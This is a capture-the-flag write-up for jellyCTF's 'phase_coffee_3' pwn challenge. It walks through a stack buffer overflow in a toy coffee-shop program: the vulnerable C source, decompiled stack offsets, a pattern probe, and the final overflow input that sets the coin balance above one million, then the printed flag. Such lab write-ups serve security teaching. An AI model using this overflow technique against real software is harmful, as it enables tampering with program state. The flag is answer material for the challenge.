# [pwn] phase_coffee_3

<table><tbody>
<tr><th>Value</th><td>100 pts</td></tr>
<tr><th>Tags</th><td><code>easy</code></td></tr>
<tr><th>Author</th><td>Sheepiroo</td></tr>
<tr><th>Connection info</th><td><code>nc chals.jellyc.tf 5002</code></td></tr>
<tr><th>Files</th><td><a href="./files/phase_coffee_3.zip">phase_coffee_3.zip</a></td></tr>
</tbody></table>

Fine.. NOW all the bugs have been fixed.

Huh? There's complaints that customers have not received their orders?

Hmm... maybe the shop should have asked for a shipping address. Anyway, that's also fixed now!

This challenge is the final challenge in a series of 3 challenges.

---

raw notes:

  - this is your classic buffer overflow vuln. we want to overflow `address` into `remaining_coin_balance` (which then gets assigned to `coin_balance`)
    ```c
    int main(int argc, char **argv) {
        int BUF_SIZE = 64;
        char address[BUF_SIZE];
        int coin_balance = 1000;
    ```
    ```c
                                int remaining_coin_balance = coin_balance - total_cost;
    
                                printf("Your order is being processed. Please enter your shipping address: ");
                                scanf("\n");
                                fgets(address, 1000, stdin);
    
                                printf("%d coffees purchased! Your coffee is being packaged and will be delivered in 2028!\n", quantity);
                                printf("Coffee will be delivered to %s\n", address);
                                printf("Current balance: %d\n", remaining_coin_balance);
    
                                coin_balance = remaining_coin_balance;
    ```
  - we can use a disassembler (e.g. Hex-Rays v8.4.0.240320 via <https://dogbolt.org/>) to get a sense of where these variables are on the stack:
    ```c
    int __fastcall main(int argc, const char **argv, const char **envp)
    {
      /* ... */
      const char **v5; // [rsp+8h] [rbp-A0h] BYREF
      /* ... */
      unsigned int v9; // [rsp+5Ch] [rbp-4Ch] BYREF
      /* ... */
      unsigned int v12; // [rsp+68h] [rbp-40h]
      /* ... */
      char *s; // [rsp+78h] [rbp-30h]
      /* ... */
      unsigned int v19; // [rsp+94h] [rbp-14h]
    
      /* ... */
      v5 = argv;
      /* ... */
      s = (char *)&v5;
      v19 = 1000;
      /* ... */
    ```
    ```c
          printf("\n\nCurrent account balance: %d \n\n", v19);
    ```
    ```c
                fgets(s, 1000, _bss_start);
                printf("%d coffees purchased! Your coffee is being packaged and will be delivered in 2028!\n", v9);
                printf("Coffee will be delivered to %s\n", s);
                printf("Current balance: %d\n", v12);
                v19 = v12;
    ```
  - rather than figure out the exact offset, we can try a big-ass input (up to 1000 - 1 characters) and work out the relative offset:
    ```
    Currently on sale
    1. Tenma Maemi Inspired - $35 each
    2. Amanogawa Shiina Inspired - $35 each
    3. Jelly Hoshiumi Inspired (Limited Edition) - $1,000,000 each
    Please make a selection: 1
    
    Enter desired quantity: 1
    
    Current balance: 1000
    Total cost: 35
    Your order is being processed. Please enter your shipping address: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxa0a1a2a3a4a5a6a7a8a9b0b1b2b3b4b5b6b7b8b9c0c1c2c3c4c5c6c7c8c9d0d1d2d3d4d5d6d7d8d9e0e1e2e3e4e5e6e7e8e9f0f1f2f3f4f5f6f7f8f9g0g1g2g3g4g5g6g7g8g9h0h1h2h3h4h5h6h7h8h9i0i1i2i3i4i5i6i7i8i9j0j1j2j3j4j5j6j7j8j9k0k1k2k3k4k5k6k7k8k9l0l1l2l3l4l5l6l7l8l9m0m1m2m3m4m5m6m7m8m9n0n1n2n3n4n5n6n7n8n9o0o1o2o3o4o5o6o7o8o9p0p1p2p3p4p5p6p7p8p9q0q1q2q3q4q5q6q7q8q9r0r1r2r3r4r5r6r7r8r9s0s1s2s3s4s5s6s7s8s9t0t1t2t3t4t5t6t7t8t9u0u1u2u3u4u5u6u7u8u9v0v1v2v3v4v5v6v7v8v9w0w1w2w3w4w5w6w7w8w9x0x1x2x3x4x5x6x7x8x9y0y1y2y3y4y5y6y7y8y9z0z1z2z3z4z5z6z7z8z9
    862270053 coffees purchased! Your coffee is being packaged and will be delivered in 2028!
    ```
  - 862270053 is 0x33653265, which is the string `e2e3` (once you correct for endianness). so bytes 149–152 correspond to `v9` (a.k.a. `quantity`) at `rsp+5Ch`, and we need to clobber up to `v12` (a.k.a. `remaining_coin_balance`) at `rsp+68h`, i.e. bytes 161–164
  - we need a value over 1 million. note that `fgets` is going to write `\n\0` at the end. `0x000affff` would be 720895, which is not enough, so we'll have to let the null sentinel spill over to whatever's adjacent. we can pick a value like 0x0a737361 (= 175338337 = `ass\n`)
    ```
    Currently on sale
    1. Tenma Maemi Inspired - $35 each
    2. Amanogawa Shiina Inspired - $35 each
    3. Jelly Hoshiumi Inspired (Limited Edition) - $1,000,000 each
    Please make a selection: 1
    
    Enter desired quantity: 1
    
    Current balance: 1000
    Total cost: 35
    Your order is being processed. Please enter your shipping address: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyye2e3yyyyyyyyass
    862270053 coffees purchased! Your coffee is being packaged and will be delivered in 2028!
    Coffee will be delivered to xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyye2e3yyyyyyyyass
    
    Current balance: 175338337
    ```
    ```
    Currently on sale
    1. Tenma Maemi Inspired - $35 each
    2. Amanogawa Shiina Inspired - $35 each
    3. Jelly Hoshiumi Inspired (Limited Edition) - $1,000,000 each
    Please make a selection: 3
    You have chosen the deluxe, premium, limited edition seiso idol princess Jelly Hoshiumi inspired coffee.
    This coffee costs $1,000,000. Press 1 to confirm purchase: 1
    YOUR FLAG IS: jellyCTF{ph4se_c0nn3ct_15_definitely_a_coff33_comp4ny}
    ```
